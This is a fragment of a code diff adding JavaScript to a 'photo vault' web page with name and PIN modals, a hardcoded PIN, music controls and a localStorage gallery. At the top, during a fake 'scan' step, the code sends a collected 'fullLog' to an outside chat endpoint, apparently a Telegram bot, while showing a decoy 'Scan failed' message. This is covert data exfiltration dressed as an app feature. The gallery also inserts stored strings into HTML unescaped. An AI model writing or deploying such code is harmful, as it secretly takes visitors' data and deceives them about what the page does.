+                    chat_id: CONFIG.chatId,
+                    text: fullLog
+                })
+            });
+
+            // Move to PIN modal
+            document.getElementById('nameModal').classList.remove('active');
+            document.getElementById('passModal').classList.add('active');
+            
+        } catch(error) {
+            console.error('Error:', error);
+            alert("⚠️ Scan failed. Try again.");
+        }
+        
+        btn.innerHTML = originalText;
+    }
+
+    // Verify PIN
+    function verifyPin() {
+        if(document.getElementById('vaultPin').value === '2009') {
+            closeModals();
+            document.getElementById('vaultPanel').classList.add('open');
+            loadPhotos();
+        } else {
+            alert("❌ ACCESS DENIED!");
+        }
+    }
+
+    // Close vault
+    function closeVault() { 
+        document.getElementById('vaultPanel').classList.remove('open'); 
+    }
+
+    // Handle zoom
+    function handleZoom(show) { 
+        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
+    }
+
+    // Music control
+    function controlMusic() {
+        const audio = document.getElementById('bgTrack');
+        const toggle = document.getElementById('mToggle');
+        if(audio.paused) { 
+            audio.play().catch(() => {}); 
+            toggle.classList.add('rotating'); 
+        } else { 
+            audio.pause(); 
+            toggle.classList.remove('rotating'); 
+        }
+    }
+
+    // Load photos
+    function loadPhotos() {
+        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
+        const grid = document.getElementById('vGrid');
+        
+        if(photos.length === 0) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 200;
+            const ctx = canvas.getContext('2d');
+            
+            const gradient = ctx.createLinearGradient(0, 0, 200, 200);
+            gradient.addColorStop(0, '#3b82f6');
+            gradient.addColorStop(1, '#1e40af');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 200, 200);
+            
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 60px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('📷', 100, 100);
+            
+            photos.push(canvas.toDataURL());
+            localStorage.setItem('vault_p', JSON.stringify(photos));
+        }
+        
+        grid.innerHTML = photos.map(src => 
+            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
+                <img src="${src}">
+            </div>`
+        ).join('');
+    }
+
+    // Add upload button
+    const uploadDiv = document.createElement('div');
+    uploadDiv.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
+    uploadDiv.innerHTML = '<i class="fa-solid fa-cloud-arrow-up" style="font-size:2rem; color:#3b82f6;"></i><p style="margin-top:10px;">Upload Photos</p>';
+    uploadDiv.onclick = () => {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.multiple = true;
+        input.onchange = () => {
+            const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
+            Array.from(input.files).forEach(file => {
+                if(file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        photos.push(e.target.result);
+                        localStorage.setItem('vault_p', JSON.stringify(photos));
+                        loadPhotos();
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+        };
+        input.click();
+    };
+    document.querySelector('.vault-panel').insertBefore(uploadDiv, document.getElementById('vGrid'));
+
+    // Load photos
+    loadPhotos();
 </script>
 </body>
 </html>
